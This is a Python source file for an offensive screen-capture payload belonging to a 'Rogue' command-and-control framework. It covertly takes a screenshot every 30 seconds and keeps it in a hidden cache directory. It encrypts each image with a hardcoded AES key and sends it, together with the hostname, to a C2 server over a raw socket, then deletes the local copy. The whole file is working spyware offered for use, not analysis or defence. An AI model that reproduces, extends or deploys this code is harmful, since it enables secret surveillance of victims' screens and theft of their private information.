#!/usr/bin/env python3
"""
PAYLOAD: Screen Capture Module
DESCRIPTION: Takes periodic screenshots and exfiltrates them to C2
AUTHOR: Rogue Red Team
VERSION: 2.0
"""
import os, sys, time, datetime, threading, socket, base64, hashlib, json
from PIL import ImageGrab
import pyautogui
from Cryptodome.Cipher import AES

class ScreenCapture:
    def __init__(self, interval=30, c2_host=None, c2_port=9091, max_screenshots=100):
        self.interval = interval
        self.c2_host = c2_host or self.get_default_c2()
        self.c2_port = c2_port
        self.max_screenshots = max_screenshots
        self.running = False
        self.encryption_key = hashlib.sha256(b'RogueScreenCap2024').digest()
        self.output_dir = os.path.expanduser("~/.cache/.rogue/screenshots")
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Clear old screenshots if over limit
        self.cleanup_old_screenshots()
    
    def get_default_c2(self):
        """Get C2 host from environment or default"""
        return os.environ.get('ROGUE_C2_HOST', 'localhost')
    
    def cleanup_old_screenshots(self):
        """Remove old screenshots if exceeding max"""
        try:
            screenshots = sorted([f for f in os.listdir(self.output_dir) if f.startswith('screenshot_')])
            if len(screenshots) > self.max_screenshots:
                for i in range(len(screenshots) - self.max_screenshots):
                    os.remove(os.path.join(self.output_dir, screenshots[i]))
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
    
    def capture_screen(self):
        """Capture the current screen"""
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            filepath = os.path.join(self.output_dir, filename)
            
            # Capture screen
            screenshot = ImageGrab.grab()
            screenshot.save(filepath, 'PNG', optimize=True, quality=85)
            
            print(f"[+] Captured screen: {filename}")
            return filepath
            
        except Exception as e:
            print(f"[!] Screen capture failed: {e}")
            return None
    
    def encrypt_file(self, filepath):
        """Encrypt file for exfiltration"""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            cipher = AES.new(self.encryption_key, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(data)
            encrypted = cipher.nonce + tag + ciphertext
            
            return base64.b64encode(encrypted).decode()
            
        except Exception as e:
            print(f"[!] Encryption failed: {e}")
            return None
    
    def exfil_screenshot(self, filepath):
        """Exfiltrate screenshot to C2"""
        try:
            encrypted_data = self.encrypt_file(filepath)
            if not encrypted_data:
                return False
            
            metadata = {
                "filename": os.path.basename(filepath),
                "timestamp": datetime.datetime.now().isoformat(),
                "hostname": socket.gethostname(),
                "size": os.path.getsize(filepath)
            }
            
            payload = {
                "metadata": metadata,
                "data": encrypted_data
            }
            
            # Send to C2
            s = socket.socket()
            s.connect((self.c2_host, self.c2_port))
            s.sendall(json.dumps(payload).encode())
            s.close()
            
            # Delete local file after successful exfiltration
            os.remove(filepath)
            print(f"[+] Exfiltrated screenshot to {self.c2_host}:{self.c2_port}")
            return True
            
        except Exception as e:
            print(f"[!] Exfiltration failed: {e}")
            return False
    
    def capture_loop(self):
        """Main capture loop"""
        while self.running:
            try:
                filepath = self.capture_screen()
                if filepath:
                    # Try to exfiltrate
                    if not self.exfil_screenshot(filepath):
                        # If exfiltration fails, keep file locally
                        print(f"[!] Keeping screenshot locally: {filepath}")
                
                time.sleep(self.interval)
                
            except Exception as e:
                print(f"[!] Capture loop error: {e}")
                time.sleep(self.interval)
    
    def start(self):
        """Start screen capture"""
        print(f"[+] Starting screen capture every {self.interval}s")
        print(f"[+] Exfiltration to {self.c2_host}:{self.c2_port}")
        print(f"[+] Local storage: {self.output_dir}")
        print("[+] Press Ctrl+C to stop")
        
        self.running = True
        self.capture_loop()
    
    def stop(self):
        """Stop screen capture"""
        self.running = False
        print("[+] Screen capture stopped")

def rogue_integration():
    """Wrapper for Rogue C2 integration"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Rogue Screen Capture')
    parser.add_argument('--interval', type=int, default=30, help='Capture interval in seconds')
    parser.add_argument('--c2-host', help='C2 server hostname')
    parser.add_argument('--c2-port', type=int, default=9091, help='C2 server port')
    parser.add_argument('--max-local', type=int, default=100, help='Maximum local screenshots to keep')
    
    args, unknown = parser.parse_known_args()
    
    # Check if we're being called from Rogue with arguments
    if len(sys.argv) > 1 and sys.argv[1] == '--rogue-integration':
        # Parse Rogue-style arguments
        args.interval = 30
        args.c2_host = None
        args.max_local = 100
    
    capturer = ScreenCapture(
        interval=args.interval,
        c2_host=args.c2_host,
        c2_port=args.c2_port,
        max_screenshots=args.max_local
    )
    
    try:
        capturer.start()
        return "[+] Screen capture started successfully"
    except Exception as e:
        return f"[!] Screen capture failed to start: {e}"

if __name__ == "__main__":
    # When run directly, start the screen capture
    capturer = ScreenCapture()
    capturer.start()
